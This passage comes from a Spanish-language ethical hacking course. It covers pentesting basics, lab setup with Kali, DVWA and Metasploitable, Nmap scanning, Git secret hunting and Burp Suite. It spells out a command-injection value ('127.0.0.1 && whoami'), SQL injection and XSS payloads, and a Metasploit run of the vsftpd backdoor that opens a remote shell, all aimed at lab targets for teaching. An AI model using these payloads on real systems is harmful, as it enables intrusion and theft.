- Consultoras de ciberseguridad
- Como **freelancers** o en plataformas de **bug bounty** (HackerOne, Bugcrowd)

---

#### üí∞ ¬øCu√°nto gana un hacker √©tico?

Depende del pa√≠s y experiencia:

- **Junior** (0-2 a√±os): \$500 ‚Äì \$1500 USD/mes
- **Intermedio** (2-5 a√±os): \$1500 ‚Äì \$4000 USD/mes
- **Senior** (+5 a√±os): \$4000 ‚Äì \$10,000 USD/mes
- **Bug bounty**: puedes ganar de \$50 a miles de d√≥lares por vulnerabilidad reportada.

---

### üìö ¬øQu√© se necesita para empezar?

#### üîë Conocimientos b√°sicos:

- Redes y protocolos (IP, TCP, DNS, HTTP)
- Sistemas operativos (Linux, Windows)
- Programaci√≥n b√°sica (Python, Bash)
- Herramientas como **Nmap**, **Wireshark**, **Burp Suite**, **Metasploit**
- Saber c√≥mo funcionan las vulnerabilidades (XSS, SQLi, CSRF, etc.)

#### üß™ Herramientas de pr√°ctica:

- **Kali Linux**
- **Metasploitable**, **DVWA**, **Mutillidae**
- Plataformas: [TryHackMe](https://tryhackme.com/), [Hack The Box](https://hackthebox.com/), [PortSwigger Web Security Academy](https://portswigger.net/web-security)

---

### üõ†Ô∏è ¬øC√≥mo instalar un entorno de hacking √©tico b√°sico?

1. **Instalar Kali Linux** (m√°quina virtual o dual boot):

   - Descarga: [https://www.kali.org/get-kali/](https://www.kali.org/get-kali/)
   - Inst√°lalo en VirtualBox:
     [Gu√≠a paso a paso de instalaci√≥n ‚Üí](https://www.kali.org/docs/virtualization/install-virtualbox-guest-vm/)

2. **Instalar m√°quinas vulnerables**:

   - [Metasploitable 2](https://sourceforge.net/projects/metasploitable/)
   - [DVWA](https://github.com/digininja/DVWA)
   - [Mutillidae](https://github.com/webpwnized/mutillidae)

3. **Conectarlas en red interna o NAT en VirtualBox** para practicar de forma segura.

---

### ‚úÖ EJEMPLO COMPLETO: simulaci√≥n de hacking √©tico

üéØ Objetivo: Identificar una vulnerabilidad en un sitio vulnerable y reportarla.

#### Escenario:

Tenemos una m√°quina con **DVWA** (Damn Vulnerable Web Application) y Kali Linux.

#### Fase 1: Reconocimiento

```bash
nmap -sV 192.168.56.101
```

Detectamos un servidor web en el puerto 80.

#### Fase 2: An√°lisis

Entramos a:
`http://192.168.56.101/DVWA`

Vamos al m√≥dulo **"Command Injection"**

Probamos:

```bash
127.0.0.1 && whoami
```

üí• Sale como resultado:

```bash
www-data
```

¬°Vulnerabilidad confirmada!

#### Fase 3: Reporte (como hacker √©tico)

Creamos un informe con:

- Descripci√≥n: Command Injection en par√°metro IP
- Prueba: `127.0.0.1 && whoami`
- Impacto: permite ejecutar comandos arbitrarios
- Soluci√≥n: sanitizar entradas de usuario

---

### üß† Conclusi√≥n

‚úÖ **El hacking √©tico es necesario para proteger sistemas, datos y personas.**

‚úÖ Puedes practicar legalmente y aprender con laboratorios gratuitos.

‚úÖ Es una **carrera con alta demanda, buen salario y prop√≥sito √©tico.**

---

[üîº](#√≠ndice)

---

## **871. Conceptos. ¬øqu√© es y qu√© no es pentesting?**

### üß† ¬øQu√© es el Pentesting?

#### üîê **Pentesting** = Penetration Testing = Pruebas de penetraci√≥n

Es un proceso **√©tico y controlado** en el cual se simula un ataque real contra un sistema, aplicaci√≥n o red, **con permiso**, para descubrir vulnerabilidades **antes de que lo hagan los atacantes reales**.

---

### ‚úÖ ¬øQu√© S√ç es Pentesting?

| ‚úÖ Es...                                     | Explicaci√≥n f√°cil                                              |
| -------------------------------------------- | -------------------------------------------------------------- |
| üîç Una **evaluaci√≥n de seguridad**           | Se analiza qu√© tan f√°cil ser√≠a vulnerar el sistema.            |
| üß™ Una **simulaci√≥n controlada de ataque**   | El pentester act√∫a como un hacker ‚Äúbueno‚Äù (white hat).         |
| üìã Basado en una **metodolog√≠a profesional** | Usa pasos como reconocimiento, escaneo, explotaci√≥n y reporte. |
| üìú **Autorizado legalmente**                 | Siempre se necesita **permiso firmado** (alcance claro).       |
| üõ°Ô∏è Sirve para **fortalecer la seguridad**    | El objetivo es **ayudar**, no da√±ar.                           |

---

### ‚ùå ¬øQu√© NO es Pentesting?

| ‚ùå No es...                        | Por qu√© no lo es                                         |
| ---------------------------------- | -------------------------------------------------------- |
| üö´ Hacking sin permiso             | Eso es **ilegal**, se considera intrusi√≥n o ciberdelito. |
| üö´ Escaneo masivo sin autorizaci√≥n | Aun si no explotas nada, puede violar leyes.             |
| üö´ Ransomware ‚Äúpor diversi√≥n‚Äù      | El pentesting **no da√±a**, **no secuestra informaci√≥n**. |
| üö´ Ataques destructivos            | No debes borrar nada ni dejar sistemas fuera de l√≠nea.   |
| üö´ Algo improvisado                | Debe seguir **una metodolog√≠a profesional y √©tica**.     |

---

### üß∞ ¬øQu√© necesito para hacer pentesting?

#### Herramientas esenciales:

- **Kali Linux**: distribuci√≥n de Linux con m√°s de 600 herramientas preinstaladas.
- **Metasploit**: framework para explotaci√≥n de vulnerabilidades.
- **Nmap**: esc√°ner de redes y puertos.
- **Burp Suite**: proxy para pentesting web.
- **Nikto**, **Hydra**, **John the Ripper**, etc.

---

### ‚öôÔ∏è ¬øC√≥mo instalar un entorno de Pentesting?

#### üîπ Opci√≥n recomendada: VirtualBox + Kali Linux + m√°quina vulnerable

##### Paso 1: Instalar VirtualBox

Descarga desde:
üëâ [https://www.virtualbox.org/wiki/Downloads](https://www.virtualbox.org/wiki/Downloads)

Instala como cualquier programa en Windows/macOS/Linux.

---

##### Paso 2: Instalar Kali Linux

1. Descarga la imagen ISO:
   üëâ [https://www.kali.org/get-kali/](https://www.kali.org/get-kali/)

2. Crea una nueva m√°quina virtual en VirtualBox:

   - Tipo: Linux
   - Versi√≥n: Debian (64-bit)
   - RAM: m√≠nimo 2 GB
   - Disco: 20 GB m√≠nimo

3. Inicia la VM y monta la ISO para instalar.

4. Sigue los pasos del asistente de instalaci√≥n.

---

##### Paso 3: Instalar m√°quina vulnerable (ej: Metasploitable 2)

1. Descarga Metasploitable 2:
   üëâ [https://sourceforge.net/projects/metasploitable/](https://sourceforge.net/projects/metasploitable/)

2. Importe la VM en VirtualBox ‚Üí ‚ÄúArchivo‚Äù ‚Üí ‚ÄúImportar dispositivo virtual‚Äù.

3. Configura **Red Interna** en ambas m√°quinas para que se comuniquen localmente.

---

### üîé Ejemplo completo: Mini Pentest con Nmap + Metasploit

#### Escenario:

Tienes tu Kali Linux funcionando y una m√°quina Metasploitable 2 corriendo en red interna con IP `192.168.56.101`.

---

##### üîç 1. Reconocimiento con Nmap

En Kali:

```bash
nmap -sV -A 192.168.56.101
```

Resultado (resumido):

```
22/tcp   open  ssh
21/tcp   open  ftp
23/tcp   open  telnet
80/tcp   open  http
...
```

---

##### üîß 2. Explotaci√≥n con Metasploit

Lanzamos el framework:

```bash
msfconsole
```

Buscamos un exploit para VSFTPD:

```bash
search vsftpd
```

Cargamos el m√≥dulo:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.101
run
```

üí• Si es vulnerable, abrir√° una **shell remota**:

```bash
[*] Command shell session 1 opened
```

Ya est√°s **dentro del sistema vulnerable** (solo en entorno de laboratorio legal).

---

##### üìã 3. Reporte (como hacker √©tico)

Documento sencillo:

- **Nombre**: vsftpd 2.3.4 vulnerable a backdoor
- **Puerto**: 21/tcp
- **Impacto**: ejecuci√≥n remota de comandos
- **Recomendaci√≥n**: actualizar o deshabilitar vsftpd, bloquear puerto si no se usa

---

### ‚úÖ Conclusi√≥n

- El **pentesting NO es hacking ilegal**, sino una actividad profesional y √©tica.
- Se realiza **bajo contrato, con permiso**, y con el fin de **ayudar a las organizaciones a mejorar su seguridad**.
- Puedes empezar en casa usando **Kali Linux y m√°quinas virtuales vulnerables**.
- Aprender paso a paso te prepara para ser un futuro **hacker √©tico profesional** üßë‚Äçüíªüõ°Ô∏è

---

[üîº](#√≠ndice)

---

## **872. Tipos de pentesting. Fase Pre-ataque**

### üß† ¬øQu√© es el Pentesting?

El **pentesting** o **penetration testing** es una simulaci√≥n de ataque a sistemas inform√°ticos, redes o aplicaciones web con el objetivo de encontrar vulnerabilidades **antes de que lo hagan los hackers maliciosos**.

---

### üß© TIPOS DE PENTESTING

Hay varias formas de clasificar un pentest. Aqu√≠ te muestro las m√°s importantes:

---

#### ‚úÖ 1. Seg√∫n el nivel de conocimiento del sistema

| Tipo          | Descripci√≥n                                                          | Ejemplo f√°cil                                             |
| ------------- | -------------------------------------------------------------------- | --------------------------------------------------------- |
| **Black Box** | No sabes nada del sistema. Eres como un hacker externo.              | Atacar una web solo con su dominio.                       |
| **Gray Box**  | Sabes informaci√≥n parcial. Como si fueras un usuario medio.          | Tienes una cuenta normal en el sistema.                   |
| **White Box** | Sabes todo: c√≥digo, infraestructura, IPs. Es una auditor√≠a profunda. | El cliente te da acceso al c√≥digo fuente y base de datos. |

---

#### ‚úÖ 2. Seg√∫n el objetivo

| Tipo                       | Explicaci√≥n                                          | Herramientas comunes               |
| -------------------------- | ---------------------------------------------------- | ---------------------------------- |
| **Pentesting Web**         | Buscas fallos en apps web.                           | Burp Suite, OWASP ZAP, Nikto       |
| **Pentesting de red**      | Buscas puertos abiertos y servicios vulnerables.     | Nmap, Metasploit, Hydra            |
| **Pentesting de sistemas** | Atacas directamente a sistemas operativos.           | Exploits locales, buffer overflows |
| **Pentesting WiFi**        | Buscas vulnerabilidades en redes inal√°mbricas.       | Aircrack-ng, Wireshark             |
| **Pentesting f√≠sico**      | Intentas acceder f√≠sicamente a servidores, oficinas. | T√©cnicas sociales o acceso f√≠sico  |

---

### üß≠ FASES DEL PENTESTING: Enfoque general

1. **Pre-ataque (Reconocimiento y escaneo)** ‚Üê Nos enfocamos aqu√≠.
2. **Ataque / Explotaci√≥n**
3. **Post-explotaci√≥n / Mantenimiento**
4. **Reporte final**

---

### üîç FASE PRE-ATAQUE: ¬øQu√© es y c√≥mo se hace?

Es la **fase de recolecci√≥n de informaci√≥n**, como cuando un ladr√≥n observa la casa antes de entrar. Aqu√≠ **no atacas todav√≠a**, solo analizas el terreno.

#### üîπ Subfases:

| Subfase                  | ¬øQu√© haces?                                         | Herramientas                 |
| ------------------------ | --------------------------------------------------- | ---------------------------- |
| üîé Reconocimiento pasivo | Buscas info sin tocar el sistema objetivo.          | Google, whois, Shodan        |
| üì° Reconocimiento activo | Escaneas directamente el objetivo.                  | Nmap, Netcat                 |
| üß± Enumeraci√≥n           | Descubres usuarios, servicios, sistemas operativos. | Enum4linux, SMBclient, Nikto |

---

### üìå Ejemplo real:

**Objetivo**: Hacer la fase pre-ataque a `http://testphp.vulnweb.com`

---

### ‚öôÔ∏è INSTALACI√ìN DEL ENTORNO DE PENTESTING

Vamos a usar:

- ‚úÖ **Kali Linux** (ya viene con todo instalado)
- ‚úÖ **VirtualBox** o **m√°quina f√≠sica**
- ‚úÖ Un objetivo vulnerable (por ejemplo, la web de prueba de Acunetix)

#### üî∏ Opci√≥n 1: Usar Kali Linux en VirtualBox

1. Descarga Kali desde: [https://www.kali.org/get-kali/](https://www.kali.org/get-kali/)
2. Importa la VM en VirtualBox
3. Actualiza el sistema:

```bash
sudo apt update && sudo apt upgrade -y
```

---

### üß™ EJEMPLO COMPLETO DE FASE PRE-ATAQUE

#### üïµÔ∏è‚Äç‚ôÇÔ∏è Objetivo: `http://testphp.vulnweb.com`

---

#### 1. RECONOCIMIENTO PASIVO

##### üîπ Usamos `whois`:

```bash
whois testphp.vulnweb.com
```

> Muestra el due√±o del dominio, pa√≠s, correo del registrante.

---

##### üîπ Buscamos con Google Hacking:

```text
site:testphp.vulnweb.com inurl:admin
```

> Esto busca p√°ginas relacionadas a ‚Äúadmin‚Äù dentro de esa web.

---

#### 2. RECONOCIMIENTO ACTIVO

##### üîπ Escaneo con `nmap`

```bash
nmap -sS -sV -O testphp.vulnweb.com
```

Par√°metros:

- `-sS`: escaneo sigiloso (SYN scan)
- `-sV`: detecta versi√≥n de servicios
- `-O`: detecta sistema operativo

Resultado esperado:

```text
80/tcp open  http Apache httpd 2.4.18
OS: Linux
```

---

#### 3. ENUMERACI√ìN

##### üîπ Usamos `nikto`:

```bash
nikto -h http://testphp.vulnweb.com
```

Nikto te dir√°:

- Versiones desactualizadas
- Archivos ocultos
- Formularios inseguros

---

### üìã Resultado final

Ya tienes:

- Informaci√≥n del sistema operativo
- Servicios corriendo (HTTP en puerto 80)
- Rutas inseguras (como `/admin`, `/login`, etc.)
- Posibles vectores para atacar en la siguiente fase

---

### ‚úÖ CONCLUSI√ìN

- El **pre-ataque** es la base de cualquier pentest serio.
- Nunca atacas sin conocer primero el objetivo.
- Herramientas clave: `nmap`, `whois`, `nikto`, Google Hacking
- Ya est√°s en camino para convertirte en **hacker √©tico profesional** üßë‚Äçüíª

---

[üîº](#√≠ndice)

---

## **873. Pr√°ctica: Buscando secretos en repositorios GIT**

### üß† ¬øQu√© significa buscar ‚Äúsecretos‚Äù en Git?

En seguridad inform√°tica, **‚Äúsecretos‚Äù** se refiere a **contrase√±as, tokens de API, claves privadas, etc.** que los desarrolladores a veces suben sin querer a sus repositorios Git (como GitHub o GitLab).

Ejemplos de secretos comunes:

- üîë Claves de AWS (`AKIA...`)
- üîê Tokens de GitHub o Discord
- üîè Archivos `.env` con credenciales
- üîì Contrase√±as en texto plano en archivos de configuraci√≥n

Un atacante puede buscar esos secretos para:

- Acceder a servidores, cuentas de servicios cloud
- Robar datos o causar da√±os

---

### üß∞ Herramientas que usaremos

Vamos a instalar y usar:

| Herramienta                                                      | ¬øPara qu√© sirve?                                      |
| ---------------------------------------------------------------- | ----------------------------------------------------- |
| üîç `git clone`                                                   | Clonar un repositorio vulnerable                      |
| üîé [`git log`](https://git-scm.com/docs/git-log)                 | Ver historial de commits                              |
| ‚èÆÔ∏è `git checkout`                                                | Volver a versiones anteriores                         |
| üõ†Ô∏è [`truffleHog`](https://github.com/trufflesecurity/trufflehog) | Herramienta autom√°tica para buscar secretos           |
| üìÅ [`gitleaks`](https://github.com/gitleaks/gitleaks)            | Otra herramienta muy potente para an√°lisis autom√°tico |

---

### üñ•Ô∏è Instalaci√≥n (en Kali Linux u otro Linux)

#### ‚úÖ Requisitos previos:

```bash
sudo apt update
sudo apt install git python3-pip -y
```

---

#### üîπ Instalar `truffleHog`:

```bash
pip install truffleHog
```

> Esto instala la herramienta para buscar secretos en el historial Git.

---

#### üîπ Instalar `gitleaks` (opcional):

```bash
wget https://github.com/gitleaks/gitleaks/releases/latest/download/gitleaks-linux-amd64 -O gitleaks
chmod +x gitleaks
sudo mv gitleaks /usr/local/bin
```

---

### üß™ EJEMPLO COMPLETO PASO A PASO

Vamos a analizar un repositorio real (de ejemplo) y buscar secretos.

#### üß∑ Repositorio vulnerable de ejemplo:

```bash
git clone https://github.com/gwen001/pentest-tools.git
cd pentest-tools
```

---

##### üîé Paso 1: Revisar manualmente con comandos Git

```bash
git log --oneline
```

> Muestra el historial de commits.

Busca mensajes sospechosos como:

- ‚Äúadd config file‚Äù
- ‚Äúfix token issue‚Äù
- ‚Äúupdate .env‚Äù

---

##### ‚èÆÔ∏è Paso 2: Volver a un commit espec√≠fico (si quieres)

```bash
git checkout <commit-id>
```

Luego puedes inspeccionar con:

```bash
cat config.py
cat .env
```

---

##### ‚öôÔ∏è Paso 3: Usar `truffleHog` para buscar secretos autom√°ticamente

```bash
trufflehog git https://github.com/gwen001/pentest-tools.git
```

TruffleHog escanear√° todo el historial y te dir√° si encontr√≥:

‚úÖ Tokens

‚úÖ Contrase√±as

‚úÖ AWS Keys

‚úÖ Archivos `.env`

‚úÖ Informaci√≥n sensible

---

#### üß™ Otro ejemplo con `gitleaks`

```bash
gitleaks detect --source=. --report-path=gitleaks-report.json
```

Te generar√° un reporte JSON con las posibles filtraciones de secretos.

---

### üìå ¬øQu√© aprendiste?

- Puedes buscar secretos manualmente revisando el historial de commits.
- Herramientas como **truffleHog** y **gitleaks** lo hacen autom√°ticamente.
- Repositorios mal gestionados pueden contener credenciales expuestas.
- Muchos pentesters y bug hunters usan esto para encontrar vulnerabilidades de configuraci√≥n.

---

### üõ°Ô∏è ¬øC√≥mo se previene?

‚úÖ Nunca subas archivos `.env`, `.pem`, `.key`, etc.

‚úÖ Usa `.gitignore` correctamente.

‚úÖ Usa herramientas de escaneo antes de hacer `git push`.

‚úÖ Revoca cualquier clave filtrada inmediatamente.

---

[üîº](#√≠ndice)

---

## **874. Introducci√≥n al escaneo de redes**

### üß† ¬øQu√© es el escaneo de redes?

El **escaneo de redes** es una t√©cnica utilizada para **identificar dispositivos (hosts), puertos abiertos, servicios y sistemas operativos** en una red. Es **una de las fases m√°s importantes del hacking √©tico y el pentesting**, y forma parte de la **fase de reconocimiento activo**.

#### üìç Objetivos:

- Saber **qui√©n est√° en la red**
- Saber **qu√© servicios est√°n corriendo**
- Identificar **vulnerabilidades potenciales**
- Descubrir **puntos de entrada para un ataque controlado**

---

### üß© Tipos de escaneo

| Tipo de escaneo     | ¬øQu√© hace?                                 | Herramienta com√∫n     |
| ------------------- | ------------------------------------------ | --------------------- |
| üß≠ Ping Scan        | Verifica qu√© hosts est√°n activos           | `nmap -sn`            |
| üîé Port Scan        | Busca puertos abiertos                     | `nmap -p`             |
| üß± Service Scan     | Detecta servicios y versiones              | `nmap -sV`            |
| üñ•Ô∏è OS Detection     | Intenta detectar el sistema operativo      | `nmap -O`             |
| üìç Topolog√≠a de red | Descubre c√≥mo se conectan los dispositivos | `nmap`, `netdiscover` |

---

### üõ†Ô∏è Herramientas para escaneo de redes

Las m√°s comunes (todas se pueden usar en **Kali Linux** o Ubuntu):

| Herramienta          | Para qu√© sirve                                         |
| -------------------- | ------------------------------------------------------ |
| **Nmap**             | La m√°s conocida. Escanea puertos, hosts, versiones, OS |
| **Netdiscover**      | Detecta dispositivos en redes LAN                      |
| **Angry IP Scanner** | GUI para Windows/Linux f√°cil de usar                   |
| **Zenmap**           | Interfaz gr√°fica de Nmap                               |
| **Masscan**          | Escaneo r√°pido a gran escala                           |

---

### ‚öôÔ∏è Instalaci√≥n de herramientas (si no est√°s en Kali)

#### ‚úÖ Instalar Nmap:

```bash
sudo apt update
sudo apt install nmap -y
```

#### ‚úÖ Instalar Netdiscover:

```bash
sudo apt install netdiscover -y
```

---

### üß™ EJEMPLO COMPLETO: Escaneo paso a paso

Vamos a usar **Nmap y Netdiscover** para hacer un escaneo en una red local (por ejemplo, una red WiFi a la que est√°s conectado desde Kali o cualquier distro Linux).

---

#### üõú 1. Obtener tu IP local y tu rango de red

Primero necesitas saber tu IP:

```bash
ip a
```

Ejemplo:

```text
inet 192.168.1.15/24
```

Tu red ser√≠a `192.168.1.0/24`

---

#### üîç 2. Escanear la red para ver qu√© dispositivos est√°n activos (Ping scan)

```bash
nmap -sn 192.168.1.0/24
```

Resultado:

```text
Host 192.168.1.1 is up (router)
Host 192.168.1.10 is up (laptop)
Host 192.168.1.20 is up (Smart TV)
```

---

#### üîé 3. Escaneo de puertos abiertos en un host

Escanea un dispositivo espec√≠fico (por ejemplo, tu router):

```bash
nmap -p 1-1000 192.168.1.1
```

Resultado:

```text
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  closed https
```

---

#### üì¶ 4. Detectar servicios y versi√≥n del software

```bash
nmap -sV 192.168.1.1
```

Resultado:

```text
80/tcp open http    lighttpd 1.4.35
22/tcp open ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
```

---

#### üñ•Ô∏è 5. Detectar el sistema operativo del host

```bash
nmap -O 192.168.1.1
```

Resultado:

```text
OS: Linux 3.X | 4.X
```

> Esto es √∫til para planear posibles exploits.

---

#### üì° 6. Escanear toda la red con Netdiscover

```bash
sudo netdiscover
```

Te muestra una tabla como esta:

```
IP              MAC Address        Vendor
192.168.1.1     00:14:22:01:23:45  TP-Link
192.168.1.15    44:87:FC:AB:12:34  Dell
192.168.1.22    58:55:CA:BB:66:77  Samsung
```

---

### üîê ¬øQu√© aprendiste con esto?

‚úÖ C√≥mo identificar los dispositivos activos

‚úÖ C√≥mo saber qu√© puertos tienen abiertos

‚úÖ C√≥mo detectar servicios y sistemas operativos

‚úÖ C√≥mo visualizar la topolog√≠a de tu red

‚úÖ C√≥mo usar herramientas b√°sicas como Nmap y Netdiscover

---

[üîº](#√≠ndice)

---

## **875. Pr√°ctica: Escaneo de redes con Nmap**

### üß† ¬øQu√© es Nmap?

**Nmap (Network Mapper)** es una herramienta de c√≥digo abierto utilizada por administradores de red, hackers √©ticos y pentesters para:

‚úÖ Escanear redes

‚úÖ Detectar hosts activos

‚úÖ Identificar puertos abiertos

‚úÖ Reconocer servicios (como SSH, HTTP, FTP)

‚úÖ Saber qu√© sistema operativo usa un dispositivo

> Es una de las herramientas m√°s usadas en **reconocimiento activo**.

---

### üì¶ ¬øC√≥mo se instala Nmap?

#### üîπ En **Kali Linux** ya viene instalado.

Pero si usas otra distro (Ubuntu, Debian), puedes instalarlo as√≠:

```bash
sudo apt update
sudo apt install nmap -y
```

#### üîπ En **Windows**

1. Ir a la p√°gina oficial: [https://nmap.org/download.html](https://nmap.org/download.html)
2. Descargar el **‚ÄúNmap Windows Installer‚Äù**
3. Instalar normalmente como cualquier programa
4. Se incluye la interfaz gr√°fica llamada **Zenmap**

---

### ‚úÖ Comandos b√°sicos de Nmap

| Comando                     | ¬øQu√© hace?                                                  |
| --------------------------- | ----------------------------------------------------------- |
| `nmap -sn 192.168.1.0/24`   | Escaneo de red para descubrir hosts activos                 |
| `nmap -p 22,80 192.168.1.1` | Escanea puertos espec√≠ficos                                 |
| `nmap -p- 192.168.1.1`      | Escanea **todos** los puertos                               |
| `nmap -sV 192.168.1.1`      | Detecta versiones de servicios                              |
| `nmap -O 192.168.1.1`       | Detecta el sistema operativo                                |
| `nmap -A 192.168.1.1`       | Escaneo agresivo (todo junto: OS, versi√≥n, traceroute, etc) |

---

### ‚ö†Ô∏è Importante

No debes escanear redes sin autorizaci√≥n. Estas pr√°cticas deben realizarse en:

‚úÖ Tu propia red

‚úÖ M√°quinas virtuales controladas

‚úÖ Laboratorios tipo Hack The Box, TryHackMe o redes locales

---

### üß™ PR√ÅCTICA COMPLETA: Escaneo con Nmap paso a paso

Supongamos que est√°s en tu casa conectado al Wi-Fi y quieres ver qu√© dispositivos hay conectados y qu√© servicios ofrecen.

---

#### üìç Paso 1: Ver tu IP y tu red

```bash
ip a
```

Ejemplo:

```
inet 192.168.1.15/24
```

Entonces tu red es: `192.168.1.0/24`

---

#### üîç Paso 2: Escanear la red para ver los dispositivos conectados

```bash
nmap -sn 192.168.1.0/24
```

Esto te da una lista de dispositivos que est√°n activos (responden al ping):

```
Nmap scan report for 192.168.1.1
Host is up (0.0031s latency).
MAC Address: A4:5E:60:12:34:56 (Tp-Link)

Nmap scan report for 192.168.1.15
Host is up (0.0002s latency).
MAC Address: D4:BE:D9:87:65:43 (Dell)

Nmap scan report for 192.168.1.22
Host is up (0.0021s latency).
MAC Address: 58:55:CA:33:44:55 (Samsung)
```

---

#### üîé Paso 3: Escanear puertos abiertos en un host

Por ejemplo, tu router est√° en `192.168.1.1`:

```bash
nmap -p 1-1000 192.168.1.1
```

Resultado:

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  closed https
```

---

#### üî¨ Paso 4: Detectar versi√≥n de servicios

```bash
nmap -sV 192.168.1.1
```

Resultado:

```
22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
80/tcp open http Apache httpd 2.4.29
```

---

#### üß† Paso 5: Detectar sistema operativo

```bash
sudo nmap -O 192.168.1.1
```

Resultado:

```
OS: Linux 2.6.32 - 4.9
```

---

#### üß® Paso 6 (opcional): Escaneo agresivo

```bash
sudo nmap -A 192.168.1.1
```

Incluye detecci√≥n de OS, versi√≥n, traceroute y m√°s.

---

### ‚úÖ Resultado Final (Resumen de tu pr√°ctica)

- Descubriste qu√© dispositivos est√°n conectados a tu red
- Escaneaste los puertos abiertos del router o un host
- Detectaste qu√© servicios corren (como HTTP, SSH)
- Supiste qu√© sistema operativo est√° usando ese host

---

### üß† Consejos para mejorar

- Prueba esto en una red virtual con Kali + otra m√°quina (como Metasploitable)
- Usa `-T4` o `-T5` para acelerar escaneos
- Guarda resultados: `nmap -oN resultado.txt 192.168.1.1`

---

[üîº](#√≠ndice)

---

## **876. Fase de Ataque. Testing de aplicaciones web con Burp suite**

### üß† ¬øQu√© es Burp Suite?

**Burp Suite** es una herramienta profesional y gratuita (versi√≥n Community) para realizar **tests de seguridad en aplicaciones web**. Es uno de los programas m√°s usados por hackers √©ticos, bug bounty hunters y pentesters.

Permite:

‚úÖ Interceptar peticiones HTTP/HTTPS

‚úÖ Manipular formularios, cookies y par√°metros

‚úÖ Buscar vulnerabilidades (XSS, SQLi, CSRF, etc.)

‚úÖ Automatizar escaneos de seguridad

‚úÖ Realizar ataques dirigidos con m√≥dulos como **Intruder**

---

### üîê ¬øEn qu√© fase del hacking entra Burp Suite?

Burp se usa en la **fase de ataque**, despu√©s de hacer reconocimiento. Cuando ya sabes qu√© sitio atacar, puedes usar Burp para **interactuar directamente con la web**, manipular formularios, enviar payloads, etc.

---

### üõ†Ô∏è ¬øC√≥mo se instala Burp Suite?

#### ‚úÖ En Kali Linux viene preinstalado

Abre el men√∫ > Web Application Analysis > **Burp Suite Community Edition**

O desde terminal:

```bash
burpsuite
```

---

#### ‚úÖ En Windows o Linux manualmente

1. Ve a: [https://portswigger.net/burp/communitydownload](https://portswigger.net/burp/communitydownload)
2. Elige la versi√≥n para tu sistema operativo
3. Inst√°lalo como cualquier otro programa

---

### üß∞ Requisitos para usar Burp correctamente

Para interceptar el tr√°fico de una aplicaci√≥n web (por ejemplo, desde el navegador), necesitas:

1. **Configurar el proxy de tu navegador** (normalmente a `127.0.0.1:8080`)
2. **Instalar el certificado de Burp Suite** en tu navegador (para HTTPS)
3. **Tener una web objetivo** (puede ser vulnerable como DVWA, Juice Shop, etc.)

---

### üß™ EJEMPLO COMPLETO DE USO DE BURP SUITE

#### üéØ Objetivo:

Vamos a interceptar y modificar el tr√°fico entre el navegador y un sitio web vulnerable llamado **DVWA** (Damn Vulnerable Web Application)

---

#### üîß Paso 1: Instalar DVWA (opcional si ya tienes)

Usa XAMPP, Docker o Mutillidae. Supongamos que ya tienes DVWA en `http://localhost/dvwa`

---

#### üöÄ Paso 2: Iniciar Burp Suite

En Kali:

```bash
burpsuite
```

Selecciona **Community Edition**, crea un nuevo proyecto y dale "Start Burp".

---

#### üåê Paso 3: Configurar el proxy en Firefox o Chrome

- Abre tu navegador
- Ve a configuraci√≥n de red
- Configura proxy manual:

  - **IP:** 127.0.0.1
  - **Puerto:** 8080

---

#### üîè Paso 4: Instalar el certificado de Burp

1. En el navegador, ve a: `http://burp`
2. Haz clic en "CA Certificate"
3. Desc√°rgalo y agr√©galo como certificado de confianza

---

#### üîç Paso 5: Activar ‚ÄúIntercept‚Äù y visitar DVWA

- En Burp: ve a la pesta√±a **Proxy > Intercept**
- Activa ‚ÄúIntercept is on‚Äù
- Ve en el navegador a `http://localhost/dvwa/login.php`

üëâ Burp te mostrar√° la petici√≥n HTTP **interceptada**. Puedes:

- Ver el m√©todo (`POST`)
- Ver los par√°metros enviados: `username=admin&password=123`
- Editar los valores antes de que lleguen al servidor

---

#### üõ†Ô∏è Paso 6: Usar otras herramientas de Burp

##### üîπ Repeater:

- Manda la petici√≥n interceptada a **Repeater**
- Modifica par√°metros y ve c√≥mo responde el servidor
- √ötil para probar manualmente inyecciones: `admin' OR 1=1--`

##### üîπ Intruder:

- Para realizar ataques autom√°ticos de fuerza bruta o fuzzing
- Ejemplo: probar m√∫ltiples contrase√±as contra un login

##### üîπ Decoder:

- Codifica/decodifica datos en base64, URL encoding, etc.

##### üîπ Scanner (Solo versi√≥n PRO):

- Realiza un escaneo autom√°tico de vulnerabilidades

---

### üß™ EJEMPLO PR√ÅCTICO: Inyecci√≥n simple de SQL

1. Captura el login en Burp Proxy
2. Manda la petici√≥n a Repeater
3. Cambia los valores:

```bash
username=admin' OR 1=1--&password=123
```

4. Haz clic en ‚ÄúSend‚Äù y observa la respuesta

üëâ Si el sitio no est√° protegido, entrar√° sin necesidad de contrase√±a.

---

### üõ°Ô∏è ¬øQu√© se puede probar con Burp Suite?

| Vulnerabilidad | ¬øC√≥mo?                                 |
| -------------- | -------------------------------------- |
| XSS            | Inyectando `<script>alert(1)</script>` |
| SQLi           | Inyectando `' OR 1=1--`                |
| CSRF           | Observando formularios sin tokens      |
| IDOR           | Cambiando IDs de usuarios en URLs      |
| File Upload    | Subiendo archivos maliciosos           |

---

### ‚úÖ Conclusiones

üîπ **Burp Suite** es una navaja suiza para el pentester web
üîπ Su punto fuerte es **interceptar y modificar tr√°fico HTTP**
üîπ Puedes usarlo para encontrar vulnerabilidades manualmente
üîπ Es compatible con otras herramientas como OWASP ZAP

---

[üîº](#√≠ndice)

---

## **877. Pr√°ctica: Explotando vulnerabilidades en metasploitable**

### üß† ¬øQu√© es Metasploitable?

**Metasploitable** es una m√°quina virtual _intencionalmente vulnerable_, creada para practicar **hacking √©tico** y **pentesting**. Fue desarrollada por Rapid7 (creadores de Metasploit).

> Es como una "pi√±ata de fallas de seguridad" para que puedas aprender sin hacer da√±o.

---

### ‚öôÔ∏è ¬øQu√© necesitas para esta pr√°ctica?

- üê± **Kali Linux** (herramienta de ataque)
- üí£ **Metasploitable 2 o 3** (objetivo vulnerable)
- üîå **VirtualBox o VMware** (para correr ambas VMs)
- üåê Ambas VMs deben estar en la **misma red** (modo "Red interna" o "Adaptador puente")

---

### üõ†Ô∏è INSTALACI√ìN DE METASPLOITABLE 2 (m√°s simple)

#### ‚úÖ 1. Descarga Metasploitable 2

